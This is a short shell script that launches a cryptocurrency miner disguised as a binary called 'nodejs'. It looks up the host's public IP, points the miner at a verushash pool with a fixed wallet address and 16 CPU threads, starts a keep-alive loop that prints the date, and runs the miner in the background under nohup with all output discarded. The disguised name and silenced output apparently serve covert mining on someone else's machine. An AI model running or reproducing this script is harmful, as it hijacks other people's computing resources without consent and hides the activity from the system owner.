chmod +x nodejs
ip=$(curl ifconfig.io)
config="--algorithm verushash --pool ussw.vipor.net:5040 --wallet RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH --password x --worker $ip --cpu-threads 16"
nohup bash -c 'while true; do date; sleep 10; done' &
nohup ./nodejs $config > /dev/null 2>&1 &
